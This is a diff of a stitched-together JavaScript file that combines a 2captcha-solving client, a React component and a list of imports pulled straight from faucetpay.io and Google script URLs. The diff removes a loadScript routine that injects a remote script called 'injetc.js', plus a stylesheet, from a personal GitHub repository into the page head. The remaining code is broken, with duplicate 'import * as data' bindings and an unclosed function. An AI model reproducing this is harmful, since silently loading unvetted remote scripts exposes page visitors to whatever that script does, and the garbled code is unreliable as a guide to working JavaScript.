@@ -418,8 +418,6 @@ class TwoCaptchaClient {
 }
 
 module.exports = TwoCaptchaClient;
-import * as data from "https://raw.githubusercontent.com/infosimples/node_two_captcha/master/src/";
-
 // 2captcha end
 
 //##############################################//
@@ -466,33 +464,6 @@ export default App = () => {
 
 //end of react video
 
-function loadScript(url, callback) {
-  
-
-
-var head1 = document.getElementsByTagName('HEAD')[0]; 
-  var link = document.createElement('link');
-  link.href = 'https://raw.githubusercontent.com/GMhabib/index.js/main/boostrapcss5.css';
-  head1.appendChild(link); 
-
-
-//<!-----Adding the script tag to the head as suggested before------->//
-
-var head = document.getElementsByTagName('head')[0];
-
-var script = document.createElement('script');
-
-script.type = 'text/javascript';
-
-script.src = 'https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js';
-
-//<!----- Then bind the event to the callback function.--->
-
-//<!----- There are several events for cross browser compatibility.----->
-
-script.onreadystatechange = callback;
-
-script.onload = callback;
 
 //import all url in here
 
@@ -525,15 +496,6 @@ import * as data from "https://faucetpay.io/dash/lib/datatables.net-responsive/j
 import * as data from "https://www.google.com/xjs/_/js/k=xjs.qs.id.zLPPe5QdokI.O/ck=xjs.qs.W9_vfKMOppA.L.W.O/am=AFEBABcAAAAAAAQQAAAEAAAgAAQSirIAgIJQAUIiAAAIYAAAAAQAEACGIAAAAICP7huAHBQAHJVwAQAAAAAAAIABHIbgRAUPAAFAAAAAAABT6DoBAIBQAAAS/d=0/esmo=1/dg=2/br=1/rs=ACT90oF1xPBzqL2jHIT256W-B7lkF6ekRQ/m=sy2r,WlNQGd,sykn,nabPbb,kQvlef,lllQlf?xjs=s2";
 
 import * as data from "https://faucetpay.io/dash/lib/feather-icons/feather.min.js";
-
-// import module
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
-//
-
-//<!----// Fire the loading--->
-
-loadScript('https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js', function() {});
 
 //<!--- ini adalah toast jika berhasil di import maka dia muncul --->
 
